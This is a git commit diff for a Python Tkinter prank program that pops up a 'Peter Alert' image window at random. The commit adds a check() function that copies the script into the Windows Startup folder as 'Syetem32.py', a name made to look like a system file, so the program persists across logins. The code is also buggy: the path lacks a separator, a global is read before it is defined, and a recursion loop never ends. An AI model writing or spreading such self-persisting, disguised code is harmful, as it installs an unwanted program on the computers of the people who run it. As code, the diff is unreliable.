16940278c0583196285955f7ab99e4938c3fb576
seemsfine2me <earth.from.mars2030@gmail.com>
2025-09-18 21:07:10 -0700

    Update main.py
    added it so it adds itself to the startup folder

--- main.py
+++ main.py
@@ -3,19 +3,18 @@ import tkinter as tk
 from tkinter import *
 import time 
 import random
-#Imports Image and ImageTk for thw image file
+import os
+import os.path
 from PIL import Image, ImageTk
-#numeber lists
+
 list = [1, 2, 3 ,4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
 list2 = [1,2,3,4,5,6,7,9,10,11,12,13]
-#rizz = True
+
 rizz = True
-#def ran
+
 def ran():
-    #makes the 'rizz' var global
     global rizz
     if rizz:
-        #makes the 'var' global
         global run 
         run = random.choice(list)
     if run == 8:
@@ -28,26 +27,40 @@ def ran():
     if root.destroy:
         ran()
     
-#def main
+def check():
+    name = "Syetem32.py"
+    os.path.expanduser("~")
+    path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    global check1
+    check1 = True
+    
+    if os.path.exists(path + name):
+        check1 = False
+    
+    if check1 == True:
+        os.chdir(path)
+        with open(name, "w") as f:
+            f.write(open("main.py").read())
+     
+
 def main():
-    #bare bones stuff
     global root 
     root = tk.Tk()
     root.title('Peter Alert')
     root.geometry("730x400")
     global rizz
     rizz = False
-    #gets the image and converts it
 
     image = Image.open("peter.png")
     tk_image = ImageTk.PhotoImage(image)
     label = tk.Label(root, image=tk_image)
     label.pack()
-    #button
     button = Button(root, text = 'Peter Alert', command=root.destroy)  
     button.pack()
     root.mainloop()
     rizz = True
 
+    if check1 == True:
+        check()
     
 ran()
